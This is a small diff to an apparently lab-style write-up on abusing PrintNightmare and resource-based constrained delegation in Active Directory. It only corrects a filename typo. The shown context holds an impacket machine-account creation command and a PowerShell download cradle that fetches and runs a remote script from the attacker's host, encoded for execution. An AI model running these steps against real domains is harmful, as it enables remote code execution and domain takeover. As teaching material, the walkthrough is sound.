@@ -125,10 +125,10 @@ addcomputer.py megacorp.local/lowpriv:'Passw0rd1!' -dc-ip 10.10.10.179 -computer
 After the machine object is successfully created (in other words we control a domain account with an SPN) I will make a file containing a simple download cradle in PowerShell and convert it to UTF-16LE:
 
 ```bash
-cat crandle.ps1
+cat cradle.ps1
 IEX(IWR http://10.10.14.11/rbcd.ps1 -UseBasicParsing)
 
-cat crandle.ps1 | iconv -t UTF-16LE | base64 -w0
+cat cradle.ps1 | iconv -t UTF-16LE | base64 -w0
 ```
 
 [![create-download-cradle.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-download-cradle.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-download-cradle.png)
